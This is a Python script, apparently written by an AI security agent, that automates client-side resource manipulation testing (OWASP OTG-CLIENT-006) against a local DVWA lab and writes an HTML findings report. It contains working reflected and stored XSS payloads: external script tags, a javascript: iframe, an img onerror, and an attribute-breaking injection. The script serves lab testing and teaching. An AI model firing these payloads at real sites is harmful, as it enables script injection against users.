#!/usr/bin/env python3
"""
DVWA Client-Side Resource Manipulation (OTG-CLIENT-006) Test Script
Author: AI Security Agent
Description: Automated testing for client-side resource manipulation vulnerabilities in DVWA
"""

import requests
from bs4 import BeautifulSoup
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import os
from datetime import datetime
import html
import urllib.parse
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class TestHTTPServer:
    """Simple HTTP server to serve test resources"""
    def __init__(self, port=8000):
        self.port = port
        self.server = None
        self.thread = None
        
    def start(self):
        """Start the HTTP server in a separate thread"""
        try:
            # Change to current directory for serving files
            os.chdir(os.path.dirname(os.path.abspath(__file__)) if os.path.exists(os.path.abspath(__file__)) else '.')
            self.server = HTTPServer(('localhost', self.port), SimpleHTTPRequestHandler)
            self.thread = threading.Thread(target=self.server.serve_forever)
            self.thread.daemon = True
            self.thread.start()
            logger.info(f"Test HTTP server started on port {self.port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start HTTP server: {e}")
            return False
    
    def stop(self):
        """Stop the HTTP server"""
        if self.server:
            self.server.shutdown()
            logger.info("Test HTTP server stopped")

class DVWAClientSideResourceManipulationTester:
    def __init__(self):
        self.base_url = "http://localhost/dvwa"
        self.session = requests.Session()
        self.driver = None
        self.http_server = TestHTTPServer()
        self.findings = {
            'reflected_script': {'vulnerable': False, 'evidence': '', 'payload': ''},
            'reflected_iframe': {'vulnerable': False, 'evidence': '', 'payload': ''},
            'stored_image': {'vulnerable': False, 'evidence': '', 'payload': ''},
            'attribute_manipulation': {'vulnerable': False, 'evidence': '', 'payload': ''}
        }
        
    def setup_driver(self):
        """Setup Chrome WebDriver for Selenium"""
        try:
            options = webdriver.ChromeOptions()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-images')
            options.add_experimental_option('useAutomationExtension', False)
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.implicitly_wait(10)
            logger.info("WebDriver initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize WebDriver: {e}")
            raise

    def login_to_dvwa(self):
        """Login to DVWA with default credentials"""
        try:
            # Get login page
            response = self.session.get(f"{self.base_url}/login.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token
            user_token_input = soup.find('input', {'name': 'user_token'})
            if user_token_input and user_token_input.get('value'):
                user_token = user_token_input['value']
                logger.info(f"Extracted user token: {user_token}")
            else:
                logger.error("Could not find user token in login page")
                return False
            
            # Login data
            login_data = {
                'username': 'admin',
                'password': 'password',
                'user_token': user_token,
                'Login': 'Login'
            }
            
            # Perform login
            login_response = self.session.post(f"{self.base_url}/login.php", data=login_data)
            
            if "Welcome :: Damn Vulnerable Web Application" in login_response.text:
                logger.info("Successfully logged into DVWA")
                return True
            else:
                logger.error("Failed to login to DVWA")
                return False
                
        except Exception as e:
            logger.error(f"Error during login: {e}")
            return False

    def set_security_level(self):
        """Set DVWA security level to Low"""
        try:
            response = self.session.get(f"{self.base_url}/security.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token - try multiple methods
            user_token = self.extract_user_token(soup)
            if not user_token:
                logger.warning("Could not find user token on security page, proceeding without it")
                user_token = ''
            
            # Set security to low
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit'
            }
            
            # Add user token if found
            if user_token:
                security_data['user_token'] = user_token
            
            self.session.post(f"{self.base_url}/security.php", data=security_data)
            logger.info("Security level set to Low")
            return True
            
        except Exception as e:
            logger.error(f"Error setting security level: {e}")
            return False

    def extract_user_token(self, soup):
        """Extract user token from BeautifulSoup object"""
        try:
            # Method 1: Direct search
            user_token_input = soup.find('input', {'name': 'user_token'})
            if user_token_input and user_token_input.get('value'):
                return user_token_input['value']
            
            # Method 2: Search by type
            user_token_inputs = soup.find_all('input', {'type': 'hidden'})
            for input_elem in user_token_inputs:
                if input_elem.get('name') == 'user_token' and input_elem.get('value'):
                    return input_elem['value']
            
            # Method 3: Search all inputs
            all_inputs = soup.find_all('input')
            for input_elem in all_inputs:
                if input_elem.get('name') == 'user_token' and input_elem.get('value'):
                    return input_elem['value']
                    
            return None
        except Exception as e:
            logger.debug(f"Error extracting user token: {e}")
            return None

    def create_test_resources(self):
        """Create test resources for resource manipulation testing"""
        try:
            # Create a simple test.js file
            test_js_content = """
// Test JavaScript file for resource manipulation testing
console.log('Test script loaded successfully');
// Log to indicate successful resource manipulation
"""
            
            with open("test.js", "w") as f:
                f.write(test_js_content)
            
            # Create a simple tracking gif (text file for simplicity)
            with open("track.gif", "w") as f:
                f.write("GIF89a")  # GIF header
            
            logger.info("Test resources created: test.js, track.gif")
            return True
            
        except Exception as e:
            logger.error(f"Error creating test resources: {e}")
            return False

    def test_reflected_script_manipulation(self):
        """Test reflected script source manipulation"""
        try:
            payload = '<script src="http://localhost:8000/test.js"></script>'
            
            # URL encode the payload for GET request
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.base_url}/vulnerabilities/xss_r/?name={encoded_payload}"
            
            # Test with requests first
            response = self.session.get(test_url)
            if payload in response.text:
                self.findings['reflected_script']['vulnerable'] = True
                self.findings['reflected_script']['payload'] = payload
                self.findings['reflected_script']['evidence'] = f"Script tag with external source reflected in response. URL: {test_url}"
                logger.info("Reflected script manipulation vulnerability detected")
            else:
                logger.info("Script payload not reflected in response")
            
            # Test with Selenium for actual rendering verification
            if self.driver:
                self.driver.get(test_url)
                page_source = self.driver.page_source
                
                # Check if the injected script is present in the DOM
                if payload in page_source:
                    self.findings['reflected_script']['vulnerable'] = True
                    self.findings['reflected_script']['evidence'] += " | Script tag rendered in page DOM"
                    logger.info("Reflected script manipulation confirmed in DOM")
                    
                    # Additional check for specific script element presence
                    try:
                        script_elements = self.driver.find_elements(By.XPATH, "//script[@src='http://localhost:8000/test.js']")
                        if script_elements:
                            self.findings['reflected_script']['evidence'] += " | External script element found in DOM"
                            logger.info("External script element confirmed")
                    except:
                        logger.info("Could not locate specific script element")
                
        except Exception as e:
            logger.error(f"Error testing reflected script manipulation: {e}")

    def test_reflected_iframe_manipulation(self):
        """Test reflected iframe source manipulation"""
        try:
            payload = '<iframe src="javascript:console.log(\'Iframe Manipulation\')"></iframe>'
            
            # URL encode the payload for GET request
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.base_url}/vulnerabilities/xss_r/?name={encoded_payload}"
            
            # Test with requests first
            response = self.session.get(test_url)
            if payload in response.text:
                self.findings['reflected_iframe']['vulnerable'] = True
                self.findings['reflected_iframe']['payload'] = payload
                self.findings['reflected_iframe']['evidence'] = f"Iframe tag with manipulated source reflected in response. URL: {test_url}"
                logger.info("Reflected iframe manipulation vulnerability detected")
            else:
                logger.info("Iframe payload not reflected in response")
            
            # Test with Selenium for actual rendering verification
            if self.driver:
                self.driver.get(test_url)
                page_source = self.driver.page_source
                
                # Check if the injected iframe is present in the DOM
                if payload in page_source:
                    self.findings['reflected_iframe']['vulnerable'] = True
                    self.findings['reflected_iframe']['evidence'] += " | Iframe tag rendered in page DOM"
                    logger.info("Reflected iframe manipulation confirmed in DOM")
                
        except Exception as e:
            logger.error(f"Error testing reflected iframe manipulation: {e}")

    def test_stored_image_manipulation(self):
        """Test stored image source manipulation"""
        try:
            payload = '<img src="http://localhost:8000/track.gif" onerror="console.log(\'Image Error\')" />'
            
            # Get stored XSS page
            response = self.session.get(f"{self.base_url}/vulnerabilities/xss_s/")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract user token with improved method
            user_token = self.extract_user_token(soup)
            if not user_token:
                logger.warning("Could not find user token for stored XSS page, trying alternative approach")
                
                # Try to get a fresh token by visiting the page again
                response2 = self.session.get(f"{self.base_url}/vulnerabilities/xss_s/")
                soup2 = BeautifulSoup(response2.text, 'html.parser')
                user_token = self.extract_user_token(soup2)
                
                if not user_token:
                    logger.warning("Still could not find user token, proceeding without it")
            
            if user_token:
                logger.info(f"Extracted user token for stored XSS: {user_token}")
            
            # Submit payload
            post_data = {
                'txtName': 'ImageTester',
                'mtxMessage': payload,
                'btnSign': 'Sign Guestbook'
            }
            
            # Add user token if found
            if user_token:
                post_data['user_token'] = user_token
            
            submit_response = self.session.post(f"{self.base_url}/vulnerabilities/xss_s/", data=post_data)
            
            # Check if payload is stored by visiting the page again
            response = self.session.get(f"{self.base_url}/vulnerabilities/xss_s/")
            if payload in response.text:
                self.findings['stored_image']['vulnerable'] = True
                self.findings['stored_image']['payload'] = payload
                self.findings['stored_image']['evidence'] = "Image tag with manipulated source stored in guestbook"
                logger.info("Stored image manipulation payload successfully stored")
            else:
                logger.info("Image payload not found in stored XSS page")
            
            # Test rendering with Selenium by visiting the page
            if self.driver:
                self.driver.get(f"{self.base_url}/vulnerabilities/xss_s/")
                page_source = self.driver.page_source
                
                # Check if the injected image is present in the DOM
                if payload in page_source:
                    self.findings['stored_image']['vulnerable'] = True
                    self.findings['stored_image']['evidence'] += " | Image tag rendered in page DOM on reload"
                    logger.info("Stored image manipulation confirmed in DOM")
                
        except Exception as e:
            logger.error(f"Error testing stored image manipulation: {e}")
            logger.error(f"Exception details: {str(e)}")

    def test_attribute_manipulation(self):
        """Test attribute-based resource manipulation"""
        try:
            payload = '" src="http://localhost:8000/test.js" onload="console.log(\'Attribute Manipulation\')'
            
            # URL encode the payload for GET request
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.base_url}/vulnerabilities/xss_r/?name={encoded_payload}"
            
            # Test with requests first
            response = self.session.get(test_url)
            
            # Test with Selenium for actual rendering verification
            if self.driver:
                self.driver.get(test_url)
                page_source = self.driver.page_source
                
                # Check if the injected attributes are present
                if 'src="http://localhost:8000/test.js"' in page_source:
                    self.findings['attribute_manipulation']['vulnerable'] = True
                    self.findings['attribute_manipulation']['payload'] = payload
                    self.findings['attribute_manipulation']['evidence'] = f"Attribute manipulation detected. URL: {test_url}"
                    logger.info("Attribute manipulation vulnerability confirmed")
                
        except Exception as e:
            logger.error(f"Error testing attribute manipulation: {e}")

    def generate_html_report(self):
        """Generate OSCP-style HTML report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # HTML escape payloads for safe display in report
        script_payload = html.escape(self.findings['reflected_script'].get('payload', ''))
        iframe_payload = html.escape(self.findings['reflected_iframe'].get('payload', ''))
        image_payload = html.escape(self.findings['stored_image'].get('payload', ''))
        attr_payload = html.escape(self.findings['attribute_manipulation'].get('payload', ''))
        
        script_evidence = html.escape(self.findings['reflected_script'].get('evidence', ''))
        iframe_evidence = html.escape(self.findings['reflected_iframe'].get('evidence', ''))
        image_evidence = html.escape(self.findings['stored_image'].get('evidence', ''))
        attr_evidence = html.escape(self.findings['attribute_manipulation'].get('evidence', ''))
        
        # Properly escape HTML tags for display in the report template
        script_tag_escaped = html.escape('<script src="...">')
        iframe_tag_escaped = html.escape('<iframe src="...">')
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>OSCP-Style Security Assessment Report</title>
  <style>
    /* OSCP-inspired styling: monospace, dark theme, clean layout */
    body {{ 
      font-family: 'Courier New', monospace; 
      background: #111; 
      color: #00FF00; 
      padding: 20px; 
      line-height: 1.6;
    }}
    .header {{ text-align: center; margin-bottom: 30px; }}
    h1, h2, h3 {{ color: #00CCFF; border-bottom: 1px solid #00CCFF; padding-bottom: 5px; }}
    .section {{ margin: 20px 0; }}
    pre {{ 
      background: #222; 
      padding: 12px; 
      border-left: 5px solid #00CCFF; 
      overflow-x: auto; 
      font-size: 0.9em;
      color: #FFCC00;
    }}
    .evidence {{ color: #FFCC00; font-weight: bold; }}
    .recommendation {{ color: #AAFF00; }}
    .vulnerable {{ color: #FF5555; font-weight: bold; }}
    .safe {{ color: #55FF55; }}
    footer {{ margin-top: 60px; font-size: 0.8em; text-align: center; color: #666; }}
    code {{ background: #333; padding: 2px 4px; border-radius: 3px; }}
  </style>
</head>
<body>
  <div class="header">
    <h1>Security Assessment Report</h1>
    <p><strong>Test ID:</strong> OTG-CLIENT-006</p>
    <p><strong>Vulnerability:</strong> Client-Side Resource Manipulation</p>
    <p><strong>Target:</strong> http://localhost/dvwa/</p>
    <p><strong>Date:</strong> {timestamp}</p>
  </div>

  <div class="section">
    <h2>1. Test Overview</h2>
    <p><strong>Objective:</strong> Detect and verify if user input can control the loading of client-side resources.</p>
    <p><strong>OWASP Reference:</strong> OTG-CLIENT-006</p>
    <p><strong>Description:</strong> Client-Side Resource Manipulation occurs when user input is used to specify the source of resources like scripts, iframes, or images, potentially leading to XSS or data exfiltration.</p>
  </div>

  <div class="section">
    <h2>2. Test Procedure</h2>
    <p>1. Authenticate to DVWA using provided credentials.</p>
    <p>2. Set security level to <strong>Low</strong>.</p>
    <p>3. Navigate to vulnerable input forms (e.g., XSS Reflected/Stores).</p>
    <p>4. Inject resource manipulation payloads such as <code>{script_tag_escaped}</code>, <code>{iframe_tag_escaped}</code>.</p>
    <p>5. Capture server responses and DOM state.</p>
    <p>6. Verify resource loading via browser automation.</p>
  </div>

  <div class="section">
    <h2>3. Findings</h2>
    <h3>Reflected Script Manipulation</h3>
    <p><strong>Status:</strong> <span class="{'vulnerable' if self.findings['reflected_script']['vulnerable'] else 'safe'}">
        {'Vulnerable' if self.findings['reflected_script']['vulnerable'] else 'Not Vulnerable'}
    </span></p>
    <p><strong>Payload Used:</strong> <code>{script_payload or 'N/A'}</code></p>
    <pre>{script_evidence or 'No evidence of vulnerability found'}</pre>
    <p class="evidence"><strong>Evidence:</strong> {'External script source reflected in response and loaded.' if self.findings['reflected_script']['vulnerable'] else 'No script manipulation detected.'}</p>

    <h3>Reflected Iframe Manipulation</h3>
    <p><strong>Status:</strong> <span class="{'vulnerable' if self.findings['reflected_iframe']['vulnerable'] else 'safe'}">
        {'Vulnerable' if self.findings['reflected_iframe']['vulnerable'] else 'Not Vulnerable'}
    </span></p>
    <p><strong>Payload Used:</strong> <code>{iframe_payload or 'N/A'}</code></p>
    <pre>{iframe_evidence or 'No evidence of vulnerability found'}</pre>
    <p class="evidence"><strong>Evidence:</strong> {'Iframe source manipulated and rendered.' if self.findings['reflected_iframe']['vulnerable'] else 'No iframe manipulation detected.'}</p>

    <h3>Stored Image Manipulation</h3>
    <p><strong>Status:</strong> <span class="{'vulnerable' if self.findings['stored_image']['vulnerable'] else 'safe'}">
        {'Vulnerable' if self.findings['stored_image']['vulnerable'] else 'Not Vulnerable'}
    </span></p>
    <p><strong>Payload Used:</strong> <code>{image_payload or 'N/A'}</code></p>
    <pre>{image_evidence or 'No evidence of vulnerability found'}</pre>
    <p class="evidence"><strong>Evidence:</strong> {'Image source manipulated and stored.' if self.findings['stored_image']['vulnerable'] else 'No stored image manipulation detected.'}</p>

    <h3>Attribute Manipulation</h3>
    <p><strong>Status:</strong> <span class="{'vulnerable' if self.findings['attribute_manipulation']['vulnerable'] else 'safe'}">
        {'Vulnerable' if self.findings['attribute_manipulation']['vulnerable'] else 'Not Vulnerable'}
    </span></p>
    <p><strong>Payload Used:</strong> <code>{attr_payload or 'N/A'}</code></p>
    <pre>{attr_evidence or 'No evidence of vulnerability found'}</pre>
    <p class="evidence"><strong>Evidence:</strong> {'HTML attributes manipulated to control resource loading.' if self.findings['attribute_manipulation']['vulnerable'] else 'No attribute manipulation detected.'}</p>
  </div>

  <div class="section">
    <h2>4. Impact</h2>
    <p>An attacker can manipulate resource loading to execute malicious scripts, exfiltrate data, or redirect users to phishing sites. This can lead to full account compromise when combined with XSS. The vulnerabilities found allow control over script sources, iframe content, and image loading, which can be exploited for various malicious purposes.</p>
  </div>

  <div class="section">
    <h2>5. Recommendations</h2>
    <p class="recommendation">- Sanitize user inputs to remove or encode resource-related attributes and tags.</p>
    <p class="recommendation">- Implement proper output encoding based on context (HTML, attribute, JavaScript, CSS).</p>
    <p class="recommendation">- Use Content Security Policy (CSP) to restrict resource loading from external domains.</p>
    <p class="recommendation">- Avoid using user input in resource URLs or HTML attributes without validation.</p>
    <p class="recommendation">- Validate and filter input for resource manipulation patterns (script, iframe, img tags).</p>
    <p class="recommendation">- Implement CSRF protection tokens for all forms.</p>
    <p class="recommendation">- Regularly audit client-side code for insecure resource handling.</p>
  </div>

  <footer>
    &copy; 2025 Automated Security Testing Framework. Report generated by AI Agent.
  </footer>
</body>
</html>"""

        # Write report to file
        try:
            with open("OTG-CLIENT-006_Report.html", "w", encoding="utf-8") as f:
                f.write(html_content)
            logger.info("HTML report generated: OTG-CLIENT-006_Report.html")
        except Exception as e:
            logger.error(f"Failed to write HTML report: {e}")

    def run_tests(self):
        """Main method to run all tests"""
        try:
            logger.info("Starting DVWA Client-Side Resource Manipulation Test (OTG-CLIENT-006)")
            
            # Setup
            self.setup_driver()
            
            # Start test HTTP server
            if self.http_server.start():
                # Create test resources
                self.create_test_resources()
            else:
                logger.warning("Could not start test HTTP server - some tests may be limited")
            
            # Login and configure
            if not self.login_to_dvwa():
                logger.error("Failed to login to DVWA. Exiting.")
                return
            
            if not self.set_security_level():
                logger.warning("Failed to set security level, continuing with default")
            
            # Run tests
            logger.info("Testing Reflected Script Manipulation...")
            self.test_reflected_script_manipulation()
            
            logger.info("Testing Reflected Iframe Manipulation...")
            self.test_reflected_iframe_manipulation()
            
            logger.info("Testing Stored Image Manipulation...")
            self.test_stored_image_manipulation()
            
            logger.info("Testing Attribute Manipulation...")
            self.test_attribute_manipulation()
            
            # Generate report
            self.generate_html_report()
            
            logger.info("All tests completed successfully")
            
        except Exception as e:
            logger.error(f"Error during testing: {e}")
        finally:
            # Cleanup
            self.http_server.stop()
            # Remove test files
            try:
                if os.path.exists("test.js"):
                    os.remove("test.js")
                if os.path.exists("track.gif"):
                    os.remove("track.gif")
            except:
                pass
            
            if self.driver:
                self.driver.quit()
                logger.info("WebDriver closed")

if __name__ == "__main__":
    tester = DVWAClientSideResourceManipulationTester()
    tester.run_tests()